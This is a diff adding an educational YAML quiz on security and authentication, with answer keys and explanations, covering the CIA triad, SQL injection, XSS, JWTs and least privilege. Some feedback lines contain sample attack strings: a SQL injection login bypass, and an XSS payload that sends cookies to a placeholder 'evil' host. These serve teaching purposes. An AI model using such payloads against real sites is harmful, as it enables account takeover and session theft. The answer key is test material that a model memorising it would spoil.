@@ -1,0 +1,447 @@
+title: "Security and Authentication Quiz"
+description: "Test your ability to reason about the CIA triad, web vulnerabilities, cryptographic primitives, authentication, and security design principles in realistic scenarios — not just recite definitions."
+active: true
+questions:
+  - id: 1
+    difficulty: basic
+    type: single
+    question: |
+      Which of the following is **not** one of the three security attributes in the **CIA triad**?
+    options:
+      - "Confidentiality — only authorized users can read sensitive data."
+      - "Integrity — only authorized users can modify sensitive data."
+      - "Availability — the system serves legitimate clients when needed."
+      - "Authenticity — the system can prove who sent a given message."
+    correct_index: 3
+    option_feedback:
+      0: |
+        Confidentiality is one of the three. The triad is **C**onfidentiality, **I**ntegrity, **A**vailability.
+      1: |
+        Integrity is one of the three. The triad is **C**onfidentiality, **I**ntegrity, **A**vailability.
+      2: |
+        Availability is one of the three. The triad is **C**onfidentiality, **I**ntegrity, **A**vailability.
+    explanation: "The CIA triad is **Confidentiality, Integrity, Availability** — the three classical attributes of information security. Authenticity (and the related properties of *non-repudiation* and *accountability*) is a real and important security goal, but it is not part of the CIA triad. Some textbooks add Authenticity as part of an extended *CIANA* or *Parkerian hexad* model — useful, but not what the standard triad refers to."
+
+  - id: 2
+    difficulty: basic
+    type: multiple
+    question: |
+      A ransomware attack encrypts the only copy of a hospital's patient records. Doctors cannot read them, and the on-disk bytes have been replaced with attacker-controlled ciphertext. **Which CIA properties has the attack violated?** (Select all that apply.)
+    options:
+      - "Confidentiality"
+      - "Integrity"
+      - "Availability"
+    correct_indices: [1, 2]
+    option_feedback:
+      0: |
+        Confidentiality means *unauthorized reads* — attackers gaining access to data they shouldn't see.
+        A pure ransomware attack typically does not exfiltrate the data; it just makes it unreadable to the
+        rightful owner. (Modern "double-extortion" ransomware *also* exfiltrates, which would add a
+        confidentiality violation — but the encryption-in-place attack on its own does not.)
+      1: |
+        Correct — overwriting the on-disk bytes with attacker-controlled ciphertext changes the data without
+        authorization, which is exactly what an integrity violation is.
+      2: |
+        Correct — the data is no longer accessible to the legitimate users who need it (doctors, the
+        hospital), which is exactly what an availability violation is.
+    explanation: "Encrypting the data in place violates **Integrity** (the bytes have been changed by an unauthorized party) and **Availability** (the legitimate users can no longer reach their data). A pure ransomware attack typically does *not* violate confidentiality, because the attackers don't need to read the data — they just need to make it unreadable to its owner. Modern 'double-extortion' ransomware exfiltrates *and* encrypts, which would add a confidentiality violation; classical ransomware does not."
+
+  - id: 3
+    difficulty: basic
+    type: single
+    question: |
+      Attackers exploit an unpatched server vulnerability and **download the personal records** of 147 million users — names, dates of birth, Social Security numbers. None of the data on the company's servers is altered or deleted. **Which CIA property is primarily violated?**
+    options:
+      - "Confidentiality"
+      - "Integrity"
+      - "Availability"
+    correct_index: 0
+    option_feedback:
+      1: |
+        Integrity would mean the data was *modified* without authorization. Here the records on the company's
+        servers were not changed — they were just *read* by the wrong party.
+      2: |
+        Availability would mean legitimate users could no longer reach the data. The company's services kept
+        running normally; the breach was that strangers obtained a copy of the data.
+    explanation: "**Confidentiality** is the violation here. Sensitive data was disclosed to people who had no business reading it. Integrity would mean the data on the company's servers was changed; Availability would mean it was inaccessible to the company. This is the textbook shape of a *data exfiltration* breach (the Equifax 2017 incident is the canonical example) — pure confidentiality, with no on-server damage."
+
+  - id: 4
+    difficulty: intermediate
+    type: single
+    question: |
+      A login handler runs the following query:
+
+      ```sql
+      SELECT * FROM Users WHERE Name = "<typed username>" AND Pass = "<typed password>"
+      ```
+
+      where `<typed username>` and `<typed password>` are concatenated into the SQL string. **What is the most direct vulnerability in this code?**
+    options:
+      - "**SQL injection** — the user controls the contents of the SQL string, so a crafted input can change the query's structure and bypass the password check."
+      - "Cross-site scripting (XSS) — the password may be rendered into a webpage."
+      - "Denial of service — the query may be slow if the database is large."
+      - "Phishing — an attacker may steal the user's password."
+    correct_index: 0
+    option_feedback:
+      1: |
+        Cross-site scripting is about user-supplied content being rendered as code in a *browser*. This bug
+        is about user-supplied content being executed as code by a *database*.
+      2: |
+        Slow queries are a performance concern, not the vulnerability the code is exposing. The injection
+        bug is present even if the query is fast.
+      3: |
+        Phishing is a social-engineering attack on the *user* to obtain credentials. This bug lets an
+        attacker bypass the password check directly, without needing to phish anyone.
+    explanation: "Building a SQL query by string-concatenating user input creates a **SQL injection** vulnerability: a payload like `\" or \"\"=\"` makes the password predicate trivially true, logging the attacker in without knowing the password. The fix is to use **parameterized queries / prepared statements**, where the SQL is parsed once with placeholders and the user input is bound separately as values."
+
+  - id: 5
+    difficulty: intermediate
+    type: single
+    question: |
+      A developer fixes the SQL injection bug from the previous question by switching to a **parameterized query**:
+
+      ```sql
+      SELECT * FROM Users WHERE Name = @0 AND Pass = @1
+      ```
+
+      with `name` and `pass` passed as separate arguments to the database driver. **What is the *primary* reason this prevents SQL injection?**
+    options:
+      - "The database driver removes dangerous characters like quotes and semicolons from the input strings before sending them."
+      - "The database parses the SQL **once** with the placeholders in place, then binds the parameter values into the already-parsed query — so the values can never become new SQL syntax."
+      - "Parameterized queries are encrypted in transit, so attackers cannot see what the query looks like."
+      - "The database checks each parameter against a list of known SQL keywords and rejects suspicious values."
+    correct_index: 1
+    option_feedback:
+      0: |
+        Some drivers do escape quotes in some modes, but escaping is fragile and bypassable across encodings.
+        The strong guarantee comes from *separation*, not *substitution*: the SQL is parsed before the values
+        are even attached.
+      2: |
+        Encryption in transit is a separate concern (TLS) and does not prevent injection. An attacker who
+        controls the input string is already inside the trust boundary of the application, regardless of
+        whether the wire is encrypted.
+      3: |
+        Keyword blocklists are a classic anti-pattern — they are easy to evade with obfuscation, comments,
+        case games, and Unicode tricks. The actual mechanism is structural: the values arrive after parsing
+        and cannot influence the query's structure.
+    explanation: "Parameterized queries protect against SQL injection through **structural separation**: the database receives the SQL with placeholders, parses it into a query plan, and *only then* binds the parameter values into that plan. The values never traverse the SQL parser, so they cannot grow new SQL syntax (extra clauses, comments, sub-queries). Escaping and blocklisting are weaker, error-prone alternatives; parameterization is the only fix that is robust to all the corner cases."
+
+  - id: 6
+    difficulty: intermediate
+    type: multiple
+    question: |
+      A social-media site lets users post comments and renders each comment by **interpolating the comment text directly into the HTML page**. Another user later views the post in their browser. **Which CIA properties can a successful XSS payload violate in this scenario?** (Select all that apply.)
+    options:
+      - "Confidentiality — the script can read the victim's cookies, session tokens, or DOM contents and exfiltrate them."
+      - "Integrity — the script can modify the rendered page, submit forms in the victim's name, or post on their behalf."
+      - "Availability — the script could lock or wedge the victim's browser tab, though this is less common in practice."
+    correct_indices: [0, 1]
+    optional_indices: [2]
+    option_feedback:
+      0: |
+        Don't omit this one — reading cookies and session tokens is the most common goal of XSS attacks.
+        Once exfiltrated, the attacker can impersonate the victim against the trusted site.
+      1: |
+        Don't omit this one — XSS routinely mutates the DOM, defaces pages, or fires off authenticated
+        requests as the victim (changing settings, posting comments, transferring funds in vulnerable apps).
+    explanation: "XSS primarily violates **Confidentiality** (cookies and tokens read and exfiltrated) and **Integrity** (the page is mutated and authenticated requests are issued in the victim's name). Availability violations are possible — a runaway script can wedge the victim's browser — but they are the least common goal of XSS in practice. The shared root cause with SQLi is *user-supplied data being treated as code by some downstream interpreter* (the database for SQLi, the browser for XSS); the fix in both cases is to keep code and data separate."
+
+  - id: 7
+    difficulty: intermediate
+    type: single
+    question: |
+      Your team is shipping a comments feature on a blog. **Which defense most directly prevents XSS attacks via the comment field?**
+    options:
+      - "Limit each comment to 280 characters so payloads are too short to do real damage."
+      - "Reject any comment whose text contains the word `script`, case-insensitively."
+      - "Render the comment by **escaping HTML metacharacters** (`<`, `>`, `\"`, `&`) at output time, so the browser sees them as literal text rather than as tag boundaries."
+      - "Store the comment in a separate database table from the rest of the site, so a SQL injection can't reach it."
+    correct_index: 2
+    option_feedback:
+      0: |
+        Length limits don't help — `<script>fetch('//evil/?c='+document.cookie)</script>` already fits in
+        well under 280 characters, and so do most worm payloads. The vulnerability is about content, not
+        size.
+      1: |
+        Keyword blocklists are a classic anti-pattern. An attacker can use `<img src=x onerror=...>`,
+        `<svg onload=...>`, or other tags that don't contain the word "script" at all. Filtering by string
+        match always loses to a clever attacker.
+      3: |
+        Storing the comment in a different table affects how data is laid out at rest, but it doesn't
+        change how the comment is *rendered*. The XSS happens at render time, in the victim's browser, when
+        the attacker-supplied HTML is interpolated into the page.
+    explanation: "The primary fix for XSS is **output encoding**: when user-supplied content is rendered into HTML, escape the metacharacters so the browser interprets them as text, not as tag boundaries. Modern templating engines (React JSX, Vue `{{ }}`, Django, Jinja2) escape by default — XSS bugs typically appear when developers explicitly *bypass* the escaping (`dangerouslySetInnerHTML`, `mark_safe`, `|safe`, `v-html`). Layered defenses (a strict Content Security Policy, `HttpOnly` cookies for session tokens) help in depth, but escaping at the rendering boundary is the foundation."
+
+  - id: 8
+    difficulty: advanced
+    type: single
+    question: |
+      A startup announces a new "proprietary, never-before-published" encryption algorithm that they claim is unbreakable because *"nobody knows how it works"*. **What is the most fundamental problem with this approach to security?**
+    options:
+      - "The algorithm is probably slow because it has not been optimized."
+      - "It violates the **Open Design** principle: a system whose security depends on the *design itself* being secret will collapse as soon as anyone reverses it. Real security must rest on key secrecy, with the algorithm itself open to public scrutiny."
+      - "The algorithm cannot be patented, so the startup will lose competitive advantage."
+      - "Custom algorithms are illegal under most national export-control laws."
+    correct_index: 1
+    option_feedback:
+      0: |
+        Performance is a legitimate but secondary concern. The deeper problem is that the *security*
+        depends on the design staying hidden — and designs do not stay hidden.
+      2: |
+        Patent considerations are a business question. The security question is whether the design will
+        survive contact with attackers, and a hidden algorithm has not been tested.
+      3: |
+        Some encryption algorithms are subject to export restrictions, but most are not — and that is not
+        what makes obscurity-based security a bad foundation. The issue is that the design *will* be
+        reverse-engineered, and then the algorithm has nothing left.
+    explanation: "This is the classic *Security through Obscurity* anti-pattern. **Open Design** says the security of a system must rest on something that stays secret even when the design is public — typically a key. AES, RSA, and TLS are all openly published; their security depends on the secrecy of *keys*, not algorithms. Public scrutiny is not a bug — it is the mechanism by which weaknesses are discovered and patched. A 'secret algorithm' has had none of that scrutiny and will fall to the first determined attacker who reverses it."
+
+  - id: 9
+    difficulty: advanced
+    type: single
+    question: |
+      Two scenarios. (1) A research team has just designed a new public-key signature scheme and wants to know whether it is secure. (2) A company is about to deploy a production system using a well-studied existing TLS library. **Which is the right disclosure stance for each?**
+    options:
+      - "Both should hide all details — secrecy is always the safest default."
+      - "Both should publish all details — transparency is always the safest default."
+      - "The research team should publish the algorithm so the security community can scrutinize it; the production company should keep its specific framework versions and configuration details non-public to slow down opportunistic attackers."
+      - "The research team should keep its algorithm secret to maintain competitive advantage; the production company should publish its full configuration so that white-hat researchers can audit it."
+    correct_index: 2
+    option_feedback:
+      0: |
+        Hiding everything is the obscurity-only stance and is exactly the failure mode the Open Design
+        principle exists to prevent. New algorithms in particular need scrutiny to find weaknesses before
+        attackers do.
+      1: |
+        Publishing the *design* of a new algorithm is right. Publishing the *exact running version and
+        configuration* of a production deployment hands attackers a free reconnaissance map — known
+        vulnerabilities in specific framework versions become trivial to weaponize.
+      3: |
+        This inverts both rules. A new algorithm without scrutiny is fragile; publishing exact production
+        config invites attackers to map known CVEs onto your deployment.
+    explanation: "**Public scrutiny** for new security designs (so weaknesses are found by the community before they ship to attackers) and **complementary obscurity** for deployed systems (hide your specific framework versions and config, so opportunistic exploits don't get a free aim) are not contradictory — they apply to different layers. The *foundation* (the algorithm, the protocol) must be open. The *deployment specifics* (versions, ports, paths) can reasonably stay hidden as a defense-in-depth layer on top of an already-strong foundation."
+
+  - id: 10
+    difficulty: basic
+    type: single
+    question: |
+      Alice wants to send a private message to Bob that only Bob can read, using **public-key cryptography**. Whose key, and which one, should Alice use to encrypt the message?
+    options:
+      - "Alice's private key — only she can sign messages."
+      - "Alice's public key — anyone can use it."
+      - "Bob's private key — only Bob can decrypt with it."
+      - "Bob's public key — only the matching private key (held by Bob) can decrypt the result."
+    correct_index: 3
+    option_feedback:
+      0: |
+        Encrypting with Alice's *private* key is what a digital *signature* does — anyone with Alice's
+        public key can decrypt it, so it is not a secret. It proves Alice wrote the message but does not
+        keep its contents private.
+      1: |
+        If Alice encrypts with her own *public* key, only her own *private* key can decrypt. Bob would not
+        be able to read it.
+      2: |
+        Alice does not have Bob's private key (and should not — that is the whole point of "private").
+        Encrypting *to* Bob is done with his *public* key.
+    explanation: "To send a message that only Bob can read, encrypt with **Bob's public key**. Anyone may have that key, so Alice can use it without prior secret sharing — but only Bob's matching *private* key (which only Bob holds) can decrypt the resulting ciphertext. This is what makes public-key cryptography solve the *key-distribution problem* that symmetric encryption suffers from: no shared secret needs to be established before private communication can begin."
+
+  - id: 11
+    difficulty: intermediate
+    type: single
+    question: |
+      In practice, a digital signature scheme **hashes the document first** and then encrypts the hash with the signer's private key — rather than encrypting the entire document. **Why?**
+    options:
+      - "Because hashing is a stronger form of encryption than RSA and provides extra confidentiality."
+      - "Because public-key operations are slow per byte; hashing first reduces every document — regardless of size — to a small fixed-length digest, so the slow public-key operation runs over a few dozen bytes instead of the whole document."
+      - "Because encrypting the whole document would make it impossible to read; the hash exists so the receiver can still see the original text."
+      - "Because hashes are reversible, and reversibility is required for a valid signature."
+    correct_index: 1
+    option_feedback:
+      0: |
+        Hashes are not encryption — they are one-way fingerprints. They provide *integrity* (any change to
+        the document changes the hash), not confidentiality.
+      2: |
+        Encrypting the document with the *private* key would let anyone with the public key decrypt and
+        read it — so the document would still be readable. The reason for hashing is performance, not
+        readability. (And digital signatures don't aim for confidentiality in the first place.)
+      3: |
+        Cryptographic hashes are *not* reversible — that is exactly why they are usable as fingerprints.
+        Reversibility would defeat the integrity guarantee.
+    explanation: "Public-key operations (RSA in particular) are roughly three orders of magnitude slower per byte than a fast hash like SHA-256. Hashing first reduces any document to a 32-byte digest, so the expensive public-key operation runs over those 32 bytes regardless of the document's original size. The hash's collision-resistance is what keeps the signature meaningful — an attacker cannot construct a *different* document that produces the same hash and therefore the same signature. Signatures provide *integrity and authenticity*, not confidentiality."
+
+  - id: 12
+    difficulty: intermediate
+    type: multiple
+    question: |
+      A junior engineer proposes that the client send the username and password **on every request**, and the server verifies them every time. **Which problems does this design have?** (Select all that apply.)
+    options:
+      - "**Slow.** Verifying a password (with a deliberately slow hash like bcrypt or Argon2) on every request adds tens of milliseconds of CPU per call."
+      - "**Insecure.** The client must keep the cleartext password in memory for the lifetime of the session, raising the blast radius of any client-side compromise. Every additional request is also another opportunity for the password to leak in a log file, debug trace, or proxy header."
+      - "**Verbose.** SQL queries become longer because they include an extra `AND password = ...` clause."
+      - "**Not authenticated enough.** The password should also be sent in the URL query string for redundancy."
+    correct_indices: [0, 1]
+    option_feedback:
+      0: |
+        Don't omit this one — slow password hashing on every request is a real performance problem. The
+        whole point of session IDs and JWTs is to amortize the password check.
+      1: |
+        Don't omit this one — keeping the cleartext password live in memory and sending it on every
+        request multiplies the chances of it being exposed.
+      2: |
+        Query length is irrelevant. The problems are performance and security exposure, not SQL aesthetics.
+      3: |
+        Putting passwords in URL query strings is a well-known anti-pattern — URLs are logged on servers,
+        proxies, browser history, and referer headers. This option is the opposite of helpful.
+    explanation: "Sending the password on every request is **slow** (passwords are deliberately hashed with a slow algorithm — bcrypt, Argon2 — that is fine to run on login but expensive to repeat on every API call) and **insecure** (the cleartext credential lives in memory and on the wire for the whole session, with many opportunities to leak). The standard fix is to authenticate *once*, then issue a short-lived session token (a session ID or JWT) that rides on subsequent requests in the client's place."
+
+  - id: 13
+    difficulty: advanced
+    type: single
+    question: |
+      A web app stores its session tokens in **`HttpOnly` cookies** and reads them only on the server. A teammate concludes: *"That makes the app immune to XSS — the script can't read the cookie, so we're safe."* **What is wrong with this conclusion?**
+    options:
+      - "Nothing — `HttpOnly` cookies fully neutralize XSS attacks."
+      - "`HttpOnly` only stops *theft* of the session ID. A script running on the trusted page can still issue authenticated `fetch` requests through the browser — the browser will dutifully attach the cookie, so the attacker rides the session even though they never read it. (And the script can still read other secrets in the DOM, deface the page, etc.)"
+      - "`HttpOnly` cookies are a deprecated standard and modern browsers no longer honor them."
+      - "`HttpOnly` is only effective on Chromium browsers; other browsers ignore the flag."
+    correct_index: 1
+    option_feedback:
+      0: |
+        XSS gives the attacker code execution inside the trusted page. Even without reading the cookie,
+        that code can do anything the legitimate page can do — including issuing authenticated requests
+        that the browser will attach the cookie to automatically.
+      2: |
+        `HttpOnly` is a long-standing, fully supported cookie attribute. The teammate's mistake is
+        conceptual, not about browser support.
+      3: |
+        `HttpOnly` is supported by every major browser. The error is in confusing *theft* of the token
+        with *use* of the session.
+    explanation: "`HttpOnly` is a valuable defense — it prevents JavaScript from *reading* the session ID and exfiltrating it — but it does **not** prevent the script from *using* the session. A script running in the trusted origin can call `fetch('/api/...', { credentials: 'include' })` and the browser will attach the cookie automatically. So the attacker rides the session in the victim's browser without ever touching the raw token. This is sometimes called *session-riding*. Layered defenses — strict CSP, output encoding to prevent XSS in the first place, `SameSite=Strict` cookies — are needed; `HttpOnly` alone is not enough."
+
+  - id: 14
+    difficulty: advanced
+    type: multiple
+    question: |
+      Which of the following are **accurate trade-offs** of using a JSON Web Token (JWT) instead of a server-managed session cookie? (Select all that apply.)
+    options:
+      - "JWTs are **stateless on the server** — there is no session store to consult, which makes horizontal scaling across many backend instances easier."
+      - "JWTs are **harder to revoke before expiry** — because the server keeps no record of valid tokens, a stolen JWT remains usable until its `exp` time. Standard mitigations are short expiries plus a separate refresh-token mechanism."
+      - "JWTs stored in `localStorage` are **directly readable by any script in the page** — XSS can exfiltrate the token. Storing the JWT in an `HttpOnly` + `SameSite` cookie reduces this risk back toward session-cookie levels."
+      - "JWTs are **mathematically unforgeable even without a key** — anyone can verify them but no one can construct a valid one."
+      - "JWTs **eliminate** the need for HTTPS, because the signature already protects against tampering."
+    correct_indices: [0, 1, 2]
+    option_feedback:
+      0: |
+        Don't omit — statelessness is the headline JWT advantage. No session store means no shared
+        coordination between backends.
+      1: |
+        Don't omit — revocation is the headline JWT *disadvantage*. A stolen JWT is good until it expires;
+        you cannot just "log it out" of a database the way you can a session ID.
+      2: |
+        Don't omit — `localStorage` is XSS-readable, which makes JWTs in `localStorage` worse than
+        `HttpOnly` cookies. The choice of *where to store* the JWT matters as much as the choice between
+        JWTs and session cookies.
+      3: |
+        Forgery resistance comes from the *signing key* held by the server. Anyone with the key can forge
+        a JWT; "no one can forge it" is wrong without that qualification.
+      4: |
+        TLS protects the *transport* — confidentiality of the request body, the URL, and the bearer token
+        itself in flight. A JWT signature does not cover any of that. Always use HTTPS regardless of
+        token format.
+    explanation: "JWTs trade a server-side session store for a *signed*, client-side token. The headline benefit is statelessness (no shared session store between backends — easier horizontal scaling). The headline costs are difficulty of revocation (no centralized 'log out' before `exp`) and the storage problem (`localStorage` is XSS-readable). Two things JWTs do **not** do: they don't eliminate the need for HTTPS, and they don't prevent forgery without key secrecy — anyone holding the signing key can mint a valid token."
+
+  - id: 15
+    difficulty: advanced
+    type: single
+    question: |
+      You are designing a small e-commerce backend with four components: a **Product Display** service, an **Email Notification** service, an **Image Upload** service, and a **System Backup** service. Following the **Principle of Least Privilege**, which permission set is most appropriate for the **Email Notification** service?
+    options:
+      - "Full read/write access to every database table, plus access to the email-sending API — so it can pull whatever data it needs for the email body."
+      - "**Send-only access to a specific email-sending API and no database access**; the data the email needs should be passed in the request, not fetched directly."
+      - "Read-only access to every database table, plus access to the email-sending API."
+      - "Root access to the underlying host, since email queues sometimes need OS-level tuning."
+    correct_index: 1
+    option_feedback:
+      0: |
+        Full read/write to every table is the *opposite* of least privilege. If the notification service
+        is compromised, the attacker now owns the entire database. The notification service does not need
+        to write to *any* table to send an email.
+      2: |
+        Read-only-everywhere is better than read/write-everywhere, but still gives an attacker who
+        compromises the notification service a free dump of every table. The data the email needs should
+        be passed in (or fetched from a narrow read-only view), not retrieved by querying every table.
+      3: |
+        Root on the host is the worst possible answer — it is the upper bound of privilege, not the lower
+        bound. OS-level tuning of email queues should be done by an explicit admin process, not by the
+        running service.
+    explanation: "The Email Notification service has one job: send email. It needs **only** the credential for the email-sending API and **no** database access. If it is later compromised — through a vulnerable dependency, a misconfigured handler, an injected payload — the blast radius is limited to whatever harm that one credential can do (sending unwanted email), not to the whole database. The pattern generalizes: each component holds the narrowest set of permissions that lets it do its job. AWS IAM, GCP IAM, and Kubernetes RBAC are all designed around this model."
+
+  - id: 16
+    difficulty: advanced
+    type: single
+    question: |
+      An emergency telephone in a hospital lobby is meant to dial **only 9-1-1**. To enforce this, the buttons are covered with an **aluminum foil shield** with cutouts for the digits "9" and "1". **Which security plan element is most clearly broken in this design?**
+    options:
+      - "The **threat model** is wrong — it assumed an attacker would only press one digit at a time, missing that any phone number consisting only of 9s and 1s (e.g. 911-1119) can still be dialed."
+      - "The **security model** is wrong — the system is not defending anything worth defending."
+      - "The **protection mechanism** is technologically obsolete — modern emergency phones use software locks instead of aluminum foil."
+      - "The **attack surface** is too small — the design should expose more buttons so the attacker can be detected more easily."
+    correct_index: 0
+    option_feedback:
+      1: |
+        The system *is* defending something real (preventing misuse of the emergency line). The failure
+        is in *who and how* the attack might happen, not in *whether* defending it is worthwhile.
+      2: |
+        The technology of the lock is not the issue. A correctly-designed mechanical cover would still be
+        a valid defense — the design here just got the threat model wrong.
+      3: |
+        Smaller attack surfaces are *better*, not worse. Exposing more buttons would make the system more
+        vulnerable, not more secure.
+    explanation: "The defense assumes the attacker will only try to press *one* digit at a time, so cutouts for just '9' and '1' are enough. But the attacker can dial any number whose digits are *drawn from* {9, 1} — for example `911-1119` is a perfectly valid 7-digit US number that this cover allows. The mistake is in the **threat model** — the description of *what* an attacker might do — not in the *strength* of the defense itself. The same image also illustrates an *attack-surface* problem (the foil itself can be torn or pushed sideways), but the most fundamental error is the threat-model misjudgment."
+
+  - id: 17
+    difficulty: expert
+    type: single
+    question: |
+      A team is building a **mobile banking app** whose backend is a fleet of microservices. Authentication must work across many services without each service hitting a shared session store on every request, but compromised tokens must be revocable in well under an hour. **Which authentication design is the best fit?**
+    options:
+      - "Send the username and password on every request, so each service can verify them independently."
+      - "Issue a long-lived session cookie (1-year expiry) backed by a central session store; rely on TLS for security."
+      - "Issue a **short-lived JWT** (e.g., 15-minute expiry) plus a longer-lived **refresh token** that *is* tracked server-side; the JWT lets services validate requests locally with no shared session store, and revoking a refresh token kills the user's access at the next renewal."
+      - "Hard-code an API key into the mobile app binary; rotate it manually if it ever leaks."
+    correct_index: 2
+    option_feedback:
+      0: |
+        Re-sending the password on every request is the naive design — slow (password hash on every call)
+        and insecure (cleartext password kept in memory for the whole session).
+      1: |
+        A 1-year session has no practical revocation story; a stolen cookie is good for a year. TLS
+        protects the wire, not the session lifetime.
+      3: |
+        Hardcoded API keys in mobile binaries are a classic anti-pattern — every user of the app holds the
+        same key, the binary can be reverse-engineered, and "manual rotation" means re-shipping the app to
+        every user every time something leaks.
+    explanation: "The combination of **short-lived JWT** (so each microservice can validate locally without shared state) and **server-tracked refresh token** (so the server retains a 'kill switch') is the standard design for distributed auth at scale. JWT expiries are kept short (5–15 minutes is common) precisely so that revocation latency is bounded — even without a central revocation list, a token only stays usable until its `exp`. Refresh tokens are checked against a server-side store at renewal time, so revoking one stops further access within one expiry window."
+
+  - id: 18
+    difficulty: intermediate
+    type: single
+    question: |
+      A teammate says: *"We don't need TLS on our API because we use JWTs, and JWTs are signed — attackers can't tamper with the requests."* **What is wrong with this claim?**
+    options:
+      - "Nothing — JWT signatures are equivalent to TLS for any practical purpose."
+      - "JWT signatures protect the integrity of the token's claims, but they do **not** encrypt anything in transit. Without TLS, the JWT itself, the request URL, headers, and request/response bodies are all visible to anyone on the network — and a stolen JWT can be replayed by the attacker."
+      - "JWTs cannot be transmitted over plain HTTP at all — the protocol forbids it."
+      - "TLS is only required for systems that handle credit-card data; JWTs cover everything else."
+    correct_index: 1
+    option_feedback:
+      0: |
+        Signatures protect *integrity* (the receiver can detect tampering). They do *not* protect
+        *confidentiality* (an eavesdropper can still read the token).
+      2: |
+        Nothing in the JWT spec forbids HTTP transport. Browsers and HTTP clients send Authorization
+        headers over HTTP just fine — that is exactly what makes plain-HTTP JWT deployments dangerous.
+      3: |
+        TLS is required for *any* sensitive data — sessions, personal data, internal APIs — not just card
+        data. The "TLS is for payments only" view is a holdover from the early HTTPS era.
+    explanation: "TLS and JWT signatures protect different properties. **TLS** encrypts the entire connection (request lines, headers, bodies) and authenticates the server. **JWT signatures** protect the integrity of the token's claims — they let the server detect that the token's contents weren't modified. Without TLS, an attacker on the network can *read* the JWT in flight and *replay* it from their own machine — the signature still verifies, because the attacker isn't modifying anything. Always serve JWT-protected APIs over HTTPS."
